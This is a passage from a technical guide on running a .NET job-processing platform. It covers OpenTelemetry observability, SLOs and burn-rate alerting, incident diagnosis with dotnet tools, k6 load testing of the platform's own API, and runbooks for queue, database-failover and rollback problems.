- [ ] Next day: check Billing → Bills and Cost Explorer for anything still charging

---

<a id="add-otel"></a>

## ➕ Observability with OpenTelemetry in .NET

### Three signals, three questions

| Signal | Answers | Example in the job platform |
|---|---|---|
| **Metrics** | "Is something wrong, and how much?" Cheap numbers over time | jobs completed/s, p99 acceptance latency, queue wait time |
| **Traces** | "Where did the time go for this one request or job?" | `POST /jobs` → INSERT → publish → worker consume → handler → UPDATE |
| **Logs** | "What exactly happened, with details?" | `Job 7f0b... failed on attempt 3: TimeoutException calling partner` |

Use them in that order during an incident: a metric alerts you, a trace shows where, logs show why.

### Structured logging with `ILogger`

```csharp
// GOOD: message template; JobId and Attempt become separate searchable fields
logger.LogWarning("Job {JobId} failed on attempt {Attempt}", job.Id, attempt);

// BAD: string interpolation; one flat string, nothing to filter on, and it is always formatted
logger.LogWarning($"Job {job.Id} failed on attempt {attempt}");
```

Fast logging with the source generator:

```csharp
public static partial class Log
{
    [LoggerMessage(Level = LogLevel.Information, Message = "Job {JobId} completed in {ElapsedMs} ms")]
    public static partial void JobCompleted(ILogger logger, Guid jobId, double elapsedMs);
}
```

Scopes add fields to every log line inside them:

```csharp
using (logger.BeginScope(new Dictionary<string, object>
       { ["JobId"] = job.Id, ["TenantId"] = job.TenantId, ["Attempt"] = attempt }))
{
    logger.LogInformation("Processing started");     // carries JobId, TenantId, Attempt
    await handler.HandleAsync(job, ct);
}
```

JSON logs to stdout are easy for CloudWatch and other tools to parse:

```csharp
builder.Logging.ClearProviders();
builder.Logging.AddJsonConsole(o => o.IncludeScopes = true);
```

### Correlation IDs

- With OpenTelemetry, the **trace ID** is your correlation ID. It flows across HTTP (the W3C `traceparent` header) and, if you add it, across RabbitMQ.
- ASP.NET Core `ProblemDetails` responses include a `traceId`. A client can send it to you, and you search for it.
- Log lines written inside a trace carry `TraceId` and `SpanId`, so logs and traces join up.

### OpenTelemetry setup (API)

```bash
dotnet add src/Jobs.Api package OpenTelemetry.Extensions.Hosting
dotnet add src/Jobs.Api package OpenTelemetry.Exporter.OpenTelemetryProtocol
dotnet add src/Jobs.Api package OpenTelemetry.Instrumentation.AspNetCore
dotnet add src/Jobs.Api package OpenTelemetry.Instrumentation.Http
dotnet add src/Jobs.Api package Npgsql.OpenTelemetry
```

```csharp
builder.Services.AddOpenTelemetry()
    .ConfigureResource(r => r.AddService(serviceName: "jobs-api"))
    .WithTracing(t => t
        .AddAspNetCoreInstrumentation()
        .AddHttpClientInstrumentation()
        .AddNpgsql()                                   // SQL spans (Npgsql.OpenTelemetry)
        .AddSource(JobTelemetry.ActivitySourceName))   // your own spans
    .WithMetrics(m => m
        .AddAspNetCoreInstrumentation()                // http.server.request.duration etc.
        .AddHttpClientInstrumentation()
        .AddMeter("System.Runtime")                    // built-in runtime metrics in .NET 9+ (verify)
        .AddMeter(JobMetrics.MeterName))
    .UseOtlpExporter();                                // one exporter for traces, metrics and logs

builder.Logging.AddOpenTelemetry(o =>
{
    o.IncludeScopes = true;
    o.IncludeFormattedMessage = true;
});
```

The OTLP exporter reads standard environment variables: `OTEL_EXPORTER_OTLP_ENDPOINT` (for example `http://aspire-dashboard:18889` for gRPC) and `OTEL_SERVICE_NAME`. The worker uses the same setup with `Host.CreateApplicationBuilder` and without the ASP.NET Core instrumentation.

### Trace context through RabbitMQ headers

HTTP propagates trace context automatically. RabbitMQ does not, unless you do it (or use the `RabbitMQ.Client.OpenTelemetry` package; verify its status). The manual version teaches the idea. This uses RabbitMQ.Client 7 (async API).

```csharp
using System.Diagnostics;
using System.Text;
using OpenTelemetry;
using OpenTelemetry.Context.Propagation;
using RabbitMQ.Client;

public static class JobTelemetry
{
    public const string ActivitySourceName = "JobPlatform.Messaging";
    public static readonly ActivitySource Source = new(ActivitySourceName);
    private static readonly TextMapPropagator Propagator = Propagators.DefaultTextMapPropagator;

    // Producer side (API)
    public static async Task PublishAsync(IChannel channel, JobCreated msg, CancellationToken ct)
    {
        using var activity = Source.StartActivity("jobs publish", ActivityKind.Producer);
        var props = new BasicProperties
        {
            Persistent = true,
            MessageId = msg.JobId.ToString(),
            ContentType = "application/json",
            Headers = new Dictionary<string, object?>()
        };
        Propagator.Inject(
            new PropagationContext(activity?.Context ?? default, Baggage.Current),
            props.Headers,
            static (headers, key, value) => headers[key] = value);      // adds "traceparent"

        var body = JsonSerializer.SerializeToUtf8Bytes(msg, MessageJson.Options);
        await channel.BasicPublishAsync("jobs", "job.created", mandatory: true, basicProperties: props, body: body, cancellationToken: ct);
    }

    // Consumer side (worker)
    public static Activity? StartConsume(IReadOnlyBasicProperties props)
    {
        var parent = Propagator.Extract(default, props, static (p, key) =>
            p.Headers is not null && p.Headers.TryGetValue(key, out var v) && v is byte[] bytes
                ? [Encoding.UTF8.GetString(bytes)]                     // header values arrive as byte[]
                : Enumerable.Empty<string>());
        Baggage.Current = parent.Baggage;
        return Source.StartActivity("jobs process", ActivityKind.Consumer, parent.ActivityContext);
    }
}
```

Now one trace shows the API request, the publish, the time the message waited, and the worker's processing and SQL.

### Custom metrics with `System.Diagnostics.Metrics`

```csharp
using System.Diagnostics.Metrics;

public sealed class JobMetrics
{
    public const string MeterName = "JobPlatform.Worker";
    private readonly Counter<long> _completed;
    private readonly Histogram<double> _duration;
    private readonly Histogram<double> _queueWait;

    public JobMetrics(IMeterFactory meterFactory)
    {
        var meter = meterFactory.Create(MeterName);
        _completed = meter.CreateCounter<long>("jobs.completed", unit: "{job}", description: "Jobs finished, by outcome");
        _duration  = meter.CreateHistogram<double>("jobs.processing.duration", unit: "s",
            advice: new InstrumentAdvice<double> { HistogramBucketBoundaries = [0.01, 0.05, 0.1, 0.25, 0.5, 1, 2.5, 5, 10, 30, 60] });
        _queueWait = meter.CreateHistogram<double>("jobs.queue.wait", unit: "s",
            advice: new InstrumentAdvice<double> { HistogramBucketBoundaries = [0.1, 0.5, 1, 5, 10, 30, 60, 120, 300, 600] });
    }

    public void Finished(string jobType, string outcome, double seconds)
    {
        var tags = new TagList { { "job.type", jobType }, { "outcome", outcome } };   // outcome: success | failed | dead_lettered
        _completed.Add(1, tags);
        _duration.Record(seconds, tags);
    }

    public void Started(string jobType, TimeSpan waitedInQueue) =>
        _queueWait.Record(waitedInQueue.TotalSeconds, new TagList { { "job.type", jobType } });
}

// Program.cs (worker)
builder.Services.AddSingleton<JobMetrics>();
```

- `InstrumentAdvice` (bucket hints) is .NET 9+ (verify). Without it, the default buckets suit milliseconds, not seconds.
- **Cardinality:** never use `JobId` or unbounded values as tags. Each tag combination is a separate time series. `job.type` and `outcome` are fine. `tenant` is fine only if the number of tenants is small.
- Queue age: `jobs.queue.wait` measures how long each message waited. Also add an **observable gauge** for the oldest waiting job: `meter.CreateObservableGauge("jobs.oldest_queued.age", () => ...)` that reads `now() - min(created_at)` for `Queued` jobs (cache it for a few seconds; do not query on every scrape).

### Local dashboards

**Option 1: Aspire dashboard (simplest).** One container receives OTLP and shows traces, metrics and structured logs. It keeps data in memory only, so use it for local work.

```bash
docker run --rm -d --name aspire-dashboard \
  -p 18888:18888 -p 4317:18889 -p 4318:18890 \
  mcr.microsoft.com/dotnet/aspire-dashboard:latest
docker logs aspire-dashboard        # prints the login URL with a token
# UI: http://localhost:18888  ·  OTLP gRPC: localhost:4317  ·  OTLP HTTP: localhost:4318
```

**Option 2: Prometheus + Grafana (closer to production).** Send OTLP to an **OpenTelemetry Collector**, which exports metrics to Prometheus (and traces to Jaeger or Tempo). Grafana reads Prometheus. Prometheus 3 can also receive OTLP metrics directly when started with `--web.enable-otlp-receiver` (verify). The `OpenTelemetry.Exporter.Prometheus.AspNetCore` package exposes a `/metrics` endpoint, but it has been prerelease for a long time (verify).

In AWS, the ADOT collector sends the same OTLP data to CloudWatch and X-Ray. Your code does not change.

### RED and USE: what to put on the dashboard

**RED** for request-driven things (API endpoints, and the worker as a "service"):

| | API (`POST /jobs`) | Worker |
|---|---|---|
| **R**ate | requests/s | jobs started/s, completed/s |
| **E**rrors | 5xx/s and 5xx ratio (4xx separately) | failed/s, dead-lettered/s |
| **D**uration | p50/p95/p99 of `http.server.request.duration` | p50/p95/p99 of `jobs.processing.duration` and `jobs.queue.wait` |

**USE** for resources:

| Resource | **U**tilization | **S**aturation | **E**rrors |
|---|---|---|---|
| CPU | % used | run queue, throttling | — |
| Memory | working set vs limit | GC pause time, gen 2 collections | OOM kills |
| Thread pool | thread count | **queue length** | — |
| DB connection pool | connections in use / max | requests waiting for a connection | pool timeouts |
| RabbitMQ queue | consumers busy | ready messages, oldest message age | DLQ count, publish nacks |
| PostgreSQL | CPU, connections | lock waits, replication lag | deadlocks |

---

<a id="add-slo"></a>

## ➕ SLIs, SLOs and error budgets for the job platform

### Words

- **SLI** (indicator): a measurement, as a ratio of good events to all events. "Share of `POST /jobs` requests that returned non-5xx in under 300 ms."
- **SLO** (objective): a target for an SLI over a window. "99.9% over 30 days."
- **Error budget:** what the SLO allows to fail. 100% − 99.9% = 0.1% of events.
- **SLA:** a contract with a penalty. It is usually looser than the internal SLO.

### Four SLOs for the platform (example targets; choose yours after measuring)

| SLI | Good event | Example SLO (30 days) |
|---|---|---|
| **Acceptance** latency and availability | `POST /jobs` returns 2xx/4xx in < 300 ms | 99.9% of requests |
| **Completion** latency | a job finishes (any final state) within 60 s of acceptance | 99% of jobs |
| **Success** rate | an accepted job ends `Completed`, not `Failed` because of **our** fault (user errors excluded) | 99.9% of jobs |
| **Queue age** (freshness) | the oldest `Queued` job is younger than 120 s, checked each minute | 99.5% of minutes |

Acceptance and completion are separate on purpose. The API can accept quickly while jobs pile up in the queue. Users care about both.

### Worked numbers

- 30 days = 30 × 24 × 60 = **43,200 minutes**.
- Acceptance at 99.9%: suppose 2,000,000 `POST /jobs` requests in 30 days. Budget = 0.1% × 2,000,000 = **2,000 bad requests**. As time: 0.1% × 43,200 = **43.2 minutes** of full outage.
- Success at 99.9%: suppose 1,500,000 jobs accepted. Budget = **1,500 failed jobs** (our fault).
- Queue age at 99.5% of minutes: 0.5% × 43,200 = **216 bad minutes** in which the oldest job was older than 120 s.

The traffic numbers above are examples for the arithmetic. Use your own measured volumes.

**Using the budget:** budget left → ship features, run drills. Budget used up → slow down risky releases and spend time on reliability.

### Alert on symptoms, not causes

- **Symptom** alerts (page someone): users are hurt. "Acceptance SLO burning fast", "queue age > 5 minutes", "success rate dropped".
- **Cause** signals (dashboard or ticket, not a page): CPU 90%, one pod restarted, disk 70%. High CPU with happy users is not an emergency. A page that needs no action trains people to ignore pages.

### Burn-rate alerts (overview)

**Burn rate** = how fast you use the budget compared with the steady rate. Burn rate 1 uses exactly the whole budget in 30 days. Burn rate 10 uses it in 3 days.

The Google SRE Workbook ("Alerting on SLOs") suggests pairs of long and short windows, for a 30-day SLO:

| Severity | Budget used | Long window | Short window | Burn rate |
|---|---|---|---|---|
| Page | 2% | 1 hour | 5 minutes | 14.4 |
| Page | 5% | 6 hours | 30 minutes | 6 |
| Ticket | 10% | 3 days | 6 hours | 1 |

Check: 2% of a 720-hour budget in 1 hour → 0.02 × 720 / 1 = 14.4. For a 99.9% SLO, burn rate 14.4 means an error ratio above 14.4 × 0.1% = **1.44%** over the last hour **and** the last 5 minutes. The short window makes the alert stop soon after the problem is fixed.

### Dashboards to build

1. **SLO overview:** each SLI now, budget left this window, burn rate.
2. **API (RED):** rate, 5xx ratio, p50/p95/p99 by endpoint; 429s and 413s separately.
3. **Pipeline:** accepted/s vs completed/s on one chart (a gap means a growing backlog), queue depth, oldest queued age, DLQ count.
4. **Worker (RED):** processing duration by job type, failures by type, retries.
5. **Resources (USE):** CPU, memory, thread-pool queue length, DB pool usage and waits, PostgreSQL connections and locks.
6. **Deploys:** mark each deploy on the charts, so "it started after the deploy" is visible.

---

<a id="add-incident"></a>

## ➕ Incident diagnosis from evidence

### The method

1. **Detect.** An alert fires, or a user reports a problem. Write down the time and the exact symptom ("p99 of `POST /jobs` is 4 s, normally 120 ms").
2. **Triage.** How bad, how wide? Which endpoints, tenants, regions? Is it getting worse? Name an incident lead. Open one channel and one timeline document.
3. **Mitigate first.** Stop the harm before you know the root cause. Roll back the last deploy, scale out, turn off a feature flag, pause one noisy tenant, fail over. "Did anything change?" (deploy, config, traffic, dependency) is the first question.
4. **Find the root cause.** Form hypotheses. For each one, name the evidence that would prove or disprove it. Collect that evidence. Change one thing at a time.
5. **Fix.** The real fix, with a test that fails without it.
6. **Postmortem.** Blameless and written. Action items with owners and dates.

Rules: evidence before opinions; write the timeline as you go; do not restart everything before you capture evidence (a dump or counters), unless users are hurting and a restart is the mitigation.

### .NET diagnostic tools

```bash
dotnet tool install -g dotnet-counters
dotnet tool install -g dotnet-dump
dotnet tool install -g dotnet-gcdump
dotnet tool install -g dotnet-stack

dotnet-counters monitor -p <pid> --counters System.Runtime     # thread pool, GC, exceptions, CPU
dotnet-stack report -p <pid>                                    # managed stacks of all threads now
dotnet-dump collect -p <pid>                                    # full dump for later analysis
dotnet-dump analyze <dump>   # then: clrstack -all, dumpasync, dumpheap -stat, gcroot <addr>
dotnet-gcdump collect -p <pid>                                  # heap snapshot, smaller than a full dump
```

In a container, either install the tools in a debug image, or run them from a sidecar container that shares the process namespace. Counter names changed to OpenTelemetry-style names in .NET 9 (for example `dotnet.thread_pool.queue.length`) (verify).

### Postmortem template (blameless)

```markdown
# Postmortem: <short title>   (date, author, status: draft/final)

## Summary
Two or three sentences: what happened, impact, how it was fixed.

## Impact
Who and what was affected, for how long. Numbers from metrics:
requests failed, jobs delayed, SLO budget used.

## Timeline (UTC)
- 09:02 deploy of sha-abc123 starts
- 09:07 alert: acceptance burn rate > 14.4
- 09:11 rollback started
- 09:15 error rate back to normal

## Root cause
The technical chain of events. Why it happened, not who did it.

## Detection
How we found out. Could we have found it sooner?

## What went well / what went badly / where we got lucky

## Action items
| Action | Type (prevent/detect/mitigate) | Owner | Due |
|---|---|---|---|
```

Blameless means: assume people acted sensibly with what they knew. Ask "why did the system allow this?" A person who fears blame hides facts, and then nobody learns.

### Practice scenario 1: latency spike with low CPU

- **Symptom:** p99 of every endpoint rises from 100 ms to several seconds. CPU is only 20%. Even `/healthz/live` is slow.
- **Hypotheses:** thread-pool starvation; a slow dependency; lock contention; GC pauses.
- **Evidence to collect:**
  - `dotnet-counters`: thread-pool **queue length** growing; thread count slowly climbing; low CPU.
  - `dotnet-stack report` or a dump: many threads blocked in `Task.Result`, `.Wait()`, `GetAwaiter().GetResult()` or `Thread.Sleep`.
  - Traces: time spent **before** the handler starts, not inside SQL.
  - GC pause time normal (rules out GC).
- **Likely cause:** sync-over-async. Blocking calls hold thread-pool threads while waiting for I/O. The pool adds threads slowly, so queued work waits. Low CPU plus slow everything is the clue.
- **Fix:** async all the way (`await`); remove `.Result`. Raising `ThreadPool.SetMinThreads` is only a short-term mitigation.

### Practice scenario 2: connection pool exhaustion

- **Symptom:** errors like `The connection pool has been exhausted, either raise 'Max Pool Size' (currently 100) or 'Timeout' (currently 15 seconds)`. Requests fail after exactly the pool timeout.
- **Hypotheses:** connections not returned (leak); long transactions; slow queries hold connections; too many instances × pool size for the server.
- **Evidence to collect:**
  - PostgreSQL: `SELECT state, count(*) FROM pg_stat_activity WHERE datname = 'jobs' GROUP BY state;` Many `idle in transaction` means code opened a transaction and did not finish it.
  - `SELECT pid, now() - xact_start AS age, state, left(query, 80) FROM pg_stat_activity WHERE datname = 'jobs' ORDER BY age DESC NULLS LAST LIMIT 10;`
  - Npgsql pool metrics (connections in use, pending requests).
  - Count instances × `Max Pool Size` vs `SHOW max_connections;`.
  - Code: `DbContext` or `NpgsqlConnection` not disposed; HTTP calls made **inside** a transaction.
- **Likely cause:** a transaction held open across a slow outbound call, or a missing `await using`, after a traffic increase.
- **Fix:** keep transactions short, never do network calls inside them, dispose connections, add `statement_timeout` and `idle_in_transaction_session_timeout`. Use a pooler (PgBouncer or RDS Proxy) if instances × pool size is too high.

### Practice scenario 3: growing queue age

- **Symptom:** the oldest queued job is 15 minutes old and rising. The API is healthy. Completed/s is below accepted/s.
- **Hypotheses:** too few or no consumers; slow handler or slow dependency; a poison message retried in a loop; one tenant flooding; prefetch set badly; the worker cannot get DB connections.
- **Evidence to collect:**
  - `rabbitmqctl list_queues name messages_ready messages_unacknowledged consumers` (or the management UI). Zero consumers means the workers are down or disconnected. High unacked with few completions means the handlers are slow or stuck.
  - Worker metrics: `jobs.processing.duration` p99 by job type; failures and retries by type.
  - Traces of a few slow jobs: which span is long?
  - The same message ID redelivered many times (poison).
  - Jobs per tenant in the last 15 minutes.
- **Likely cause:** a downstream dependency slowed down, so each job takes longer and throughput fell below the arrival rate. Or a poison message is retried forever without a DLQ.
- **Fix:** mitigate by scaling workers (only if the dependency can take it) or pausing the noisy tenant. Then add timeouts, a maximum attempt count with a DLQ, and per-tenant fairness.

### Practice scenario 4: memory growth

- **Symptom:** worker memory rises steadily over hours, then the container restarts with exit code 137 (`OOMKilled: true`).
- **Hypotheses:** a managed leak (an unbounded cache or collection, static event handlers); large objects (LOH) from big payloads; too many prefetched messages held in memory; native memory.
- **Evidence to collect:**
  - `dotnet-counters`: GC heap size growing after each gen 2 collection (a real leak), or stable heap with growing working set (native memory).
  - Two `dotnet-gcdump` snapshots an hour apart; compare which types grew.
  - `dotnet-dump analyze` → `dumpheap -stat`, then `gcroot` on a growing object to see who holds it.
  - Prefetch count × message size.
- **Likely cause:** a `static Dictionary` used as a cache with no size limit or expiry, or a handler that subscribes to an event and never unsubscribes.
- **Fix:** `MemoryCache` with `SizeLimit` and expiry; unsubscribe or use weak references; stream large payloads; lower prefetch. Add a memory alert before the limit.

### Practice scenario 5: 502s after a deploy

- **Symptom:** right after a deploy, the ALB returns 502 Bad Gateway for some or all requests.
- **Hypotheses:** the app is not listening on the target port; the app crashes at startup; targets get traffic before they are ready; connections are cut during shutdown of the old tasks; keep-alive timeout mismatch.
- **Evidence to collect:**
  - ECS events and stopped-task reasons; the task's exit code and its last log lines (a missing secret or config value often crashes startup).
  - Target group health: are targets healthy? Which port is the health check using?
  - Did the image change its port? .NET 8+ images listen on **8080**, not 80. An old task definition or target group may still use 80.
  - Do the 502s happen only while the deploy runs? Then look at shutdown: SIGTERM handling, the deregistration delay, `stopTimeout`.
  - ALB access logs: `elb_status_code` 502 with `target_status_code` `-` means the target closed or refused the connection.
- **Likely cause:** port mismatch (80 vs 8080), or a startup crash from missing config, or no readiness gate so traffic arrives before the app is ready.
- **Fix:** roll back first. Then fix the port or config, gate traffic on `/healthz/ready`, set the deregistration delay and `stopTimeout` longer than the app's shutdown time, and add a smoke test that would have caught it.

---

<a id="add-loadtest"></a>

## ➕ Load testing with k6

### Open vs closed models

- **Closed model:** a fixed number of virtual users (VUs). Each one sends a request, **waits** for the reply, then sends the next. If the system slows down, the load drops by itself. This hides problems (it is called "coordinated omission"). k6 executors: `constant-vus`, `ramping-vus`.
- **Open model:** requests **arrive** at a fixed rate, whether or not earlier ones finished. This is how internet traffic behaves. If the system slows down, work piles up, which is exactly what you want to see. k6 executors: `constant-arrival-rate`, `ramping-arrival-rate`.
- Use the **open** model for the job API.

**Offered load vs throughput:** offered load is what k6 tries to send (requests/s). Throughput is what the system actually handled. If k6 reports `dropped_iterations`, it did not have enough VUs to offer the planned load. That step of the test is invalid: add `preAllocatedVUs`/`maxVUs` or a bigger load machine.

### A k6 script for `POST /jobs`

Separate scenarios per step give separate numbers per step. Thresholds on each scenario's tag also make k6 print those numbers in its summary.

```javascript
// load/jobs.js
// Run: k6 run -e BASE_URL=http://localhost:8080 -e TOKEN=$TOKEN load/jobs.js
import http from 'k6/http';
import { check } from 'k6';
import { uuidv4 } from 'https://jslib.k6.io/k6-utils/1.4.0/index.js';

const BASE = __ENV.BASE_URL;
const params = () => ({
  headers: {
    'Content-Type': 'application/json',
    'Authorization': `Bearer ${__ENV.TOKEN}`,
    'Idempotency-Key': uuidv4(),
  },
  tags: { name: 'POST /jobs' },
});

const step = (rate, startTime) => ({
  executor: 'constant-arrival-rate',
  rate, timeUnit: '1s', duration: '3m', startTime,
  preAllocatedVUs: 50, maxVUs: 400,
  exec: 'submitJob',
});

export const options = {
  scenarios: {
    warmup:   { ...step(10, '0s') , duration: '1m' },
    step_50:  step(50,  '1m'),
    step_100: step(100, '4m'),
    step_200: step(200, '7m'),
  },
  thresholds: {
    'http_req_failed{scenario:step_50}':    ['rate<0.01'],
    'http_req_duration{scenario:step_50}':  ['p(95)<200', 'p(99)<300'],
    'http_req_failed{scenario:step_100}':   ['rate<0.01'],
    'http_req_duration{scenario:step_100}': ['p(95)<200', 'p(99)<300'],
    'http_req_failed{scenario:step_200}':   ['rate<0.01'],
    'http_req_duration{scenario:step_200}': ['p(95)<200', 'p(99)<300'],
    'dropped_iterations':                   ['count<1'],
  },
  summaryTrendStats: ['avg', 'p(50)', 'p(95)', 'p(99)', 'max'],
};

export function submitJob() {
  const body = JSON.stringify({ type: 'simulate', payload: { workMs: 50 } });
  const res = http.post(`${BASE}/jobs`, body, params());
  check(res, { 'accepted (202)': (r) => r.status === 202 });
}

export function handleSummary(data) {
  return { 'load/summary.json': JSON.stringify(data, null, 2) };
}
```

The rates and thresholds are starting values. Change them after your first run. The `simulate` job type does fixed fake work (`workMs`), so runs are comparable.

### Measure acceptance and completion separately

- **Acceptance** = the `POST /jobs` latency that k6 measures. It shows API + database insert + publish.
- **Completion** = time from `created_at` to `completed_at` per job. k6 cannot see this without polling, and polling adds load. Measure it from the database (or from the `jobs.queue.wait` and `jobs.processing.duration` metrics):

```sql
-- completed per second and completion latency, per minute of the run
SELECT date_trunc('minute', completed_at)                          AS minute,
       count(*) / 60.0                                             AS completed_per_s,
       percentile_cont(0.50) WITHIN GROUP (ORDER BY extract(epoch FROM completed_at - created_at)) AS p50_s,
       percentile_cont(0.95) WITHIN GROUP (ORDER BY extract(epoch FROM completed_at - created_at)) AS p95_s,
       percentile_cont(0.99) WITHIN GROUP (ORDER BY extract(epoch FROM completed_at - created_at)) AS p99_s
FROM jobs
WHERE completed_at BETWEEN :run_start AND :run_end
GROUP BY 1 ORDER BY 1;

-- backlog left at the end of the run
SELECT count(*) AS still_queued, max(now() - created_at) AS oldest_age
FROM jobs WHERE status = 'Queued';
```

If accepted/s stays above completed/s, the backlog grows without limit. The system is over capacity, even if the API looks fast.

### The benchmark report

Fill every field from **your** run. Leave a field empty rather than guess.

| Field | Value |
|---|---|
| Date, Git SHA, image tags | |
| Environment (laptop/EC2/ECS; instance sizes; CPU and memory per container) | |
| Versions (.NET, PostgreSQL, RabbitMQ, k6) | |
| Dataset (rows in `jobs` before the run; indexes) | |
| Payload (job type, size in bytes, simulated work) | |
| Duration per step | |
| Offered rate per step (req/s) | |
| Accepted/s per step | |
| Completed/s per step | |
| Acceptance p50 / p95 / p99 per step | |
| Completion p50 / p95 / p99 per step | |
| Errors (rate and types; any `dropped_iterations`) | |
| Oldest queue age (max during the run; at the end) | |
| Resource use (CPU, memory, DB connections, thread-pool queue) | |
| Bottleneck found, and the evidence for it | |

### 1 worker vs 4 workers

1. Same image, same dataset (reset the database), same payload, same offered rate. Change only the worker count: `docker compose up -d --scale worker=1`, then `--scale worker=4`.
2. Choose an offered rate that **saturates** one worker (completed/s clearly below accepted/s).
3. Record completed/s, completion p99 and the oldest queue age for both runs.

| Workers | Offered/s | Completed/s | Completion p99 | Oldest queue age | Bottleneck |
|---|---|---|---|---|---|
| 1 | | | | | |
| 4 | | | | | |

Scaling is usually **less** than linear. Find out why: database CPU, lock waits on the claim query, the connection pool, broker prefetch, or the load generator itself. Write the sentence with your own numbers, for example "4 workers gave N× the throughput of 1; the database CPU reached X%, so the database is the next limit."

**Never claim a number you did not measure.** In an interview, "I measured X on a 2-vCPU laptop under Docker" is strong. A number you cannot explain is a trap.

---

<a id="add-runbook"></a>

## ➕ Runbooks

A runbook is a short, tested checklist for one known problem, written so a tired person at 3 a.m. can follow it. Keep runbooks in the repo (`docs/runbooks/`) and link each alert to its runbook.

### Template

```markdown
# Runbook: <alert or problem name>

**Alert:** <alert name and the condition that fires it>
**Severity:** page / ticket          **Owner:** <team or person>
**Last tested:** <date>               **Dashboard:** <link>

## What it means
One or two sentences. What users feel.

## Check first (5 minutes)
1. <command or dashboard> → what "bad" looks like
2. Did anything change? Recent deploys, config, traffic.

## Mitigate
- Option A: <safe action> → how to confirm it worked
- Option B: <next action>

## Find the cause
Hypotheses and the evidence for each.

## Escalate
When and to whom.

## After
Postmortem needed? Follow-up tickets.
```

### Runbook 1: DLQ is growing

**Alert:** `jobs.dlq` has more than 0 messages for 10 minutes, or grows by more than 50 in 10 minutes (example values).

1. **Look before acting.** How many messages, since when, which job types?
   ```bash
   rabbitmqctl list_queues name messages consumers | grep -E "jobs|dlq"
   ```
   In the management UI (`http://localhost:15672` or the Amazon MQ console), open `jobs.dlq` → "Get messages" with **"Nack message requeue true"** so you read without removing. Check the headers: `x-death` (reason, original queue, count), and your own `x-last-error` header if you add one.
2. **Classify:**
   - **Poison** (bad payload, a bug for one job type): the same error on every message of one type. Redriving will fail again.
   - **Transient** (a dependency was down): timeouts or 503s during a known window. Redriving should work now.
3. **Mitigate:** for poison, turn off or fix the failing job type (feature flag, or a hotfix deploy). For a dependency outage, wait until the dependency is healthy.
4. **Redrive in small batches** after the fix. Use the shovel plugin's "Move messages" in the management UI, or a small admin command that reads N messages from the DLQ and republishes them to `jobs`. Watch the failure rate after each batch.
5. **Check:** DLQ back to 0; those jobs show `Completed` in the database. Jobs that can never succeed get marked `Failed` with a reason, and the tenant can see it.
6. **After:** add a test with the poison payload. Add validation at `POST /jobs` if the payload should have been rejected at the start.

### Runbook 2: database failover (RDS Multi-AZ)

**Alert:** RDS event "Multi-AZ instance failover started", or a spike of connection errors from the API and workers.

1. **Confirm:** RDS console → Events, or:
   ```bash
   aws rds describe-events --source-identifier jobs-db --source-type db-instance --duration 60
   ```
2. **Expect** a short window (AWS documents about one to two minutes for a Multi-AZ instance failover; verify for your setup) in which connections fail. The endpoint DNS name moves to the standby. Your code must keep using the **endpoint name**, never an IP.
3. **Watch the apps:**
   - The API returns 503 for a short time. Requests with EF Core retries (`EnableRetryOnFailure`) may succeed after a delay.
   - Workers fail some attempts. Messages are not acked, so they are redelivered. Idempotent handlers make this safe.
   - Npgsql drops broken connections from the pool. If errors continue after the database is available, restart the tasks (rolling) to clear stale connections and DNS caches.
4. **Check:** error rate back to normal; `/healthz/ready` green on all tasks; queue age falling.
5. **Reconcile:** find jobs stuck in `Running` whose lease expired during the failover. The lease-expiry logic should re-queue them. Verify with:
   ```sql
   SELECT count(*) FROM jobs WHERE status = 'Running' AND lease_expires_at < now();
   ```
6. **Practise it in staging** before you ever need it:
   ```bash
   aws rds reboot-db-instance --db-instance-identifier jobs-db --force-failover
   ```
   Measure how long errors lasted and whether any job was lost or run twice.

### Runbook 3: rolling back a bad deploy

**Alert:** within 30 minutes of a deploy: 5xx ratio or p99 above the alert line, smoke test failed, or the completion SLO burns fast.

1. **Decide quickly.** If the problem started with the deploy, roll back first and investigate later. Do not debug in production while users wait.
2. **Find the last good version:**
   ```bash
   aws ecs describe-services --cluster jobs --services jobs-api \
     --query "services[0].deployments[].{status:status,taskDef:taskDefinition,created:createdAt}"
   ```
3. **Roll back** to the previous task definition revision (it points to the previous image SHA):
   ```bash
   aws ecs update-service --cluster jobs --service jobs-api --task-definition jobs-api:41
   aws ecs wait services-stable --cluster jobs --services jobs-api
   ```
   Do the same for `jobs-worker` if it was part of the release. On Kubernetes: `kubectl -n jobs rollout undo deploy/jobs-api`.
4. **Database:** do **not** roll back an expand-only migration. The old code works with the extra column. If the release had a contract (destructive) migration, stop: that needs a restore decision, so escalate.
5. **Messages:** if the new version published messages the old worker cannot read, pause publishing (feature flag), or keep the new worker and roll back only the API.
6. **Check:** run `smoke.sh`; 5xx and p99 back to normal; queue age falling.
7. **After:** block the bad SHA from redeploying. Write the postmortem. Add the missing test or alert.
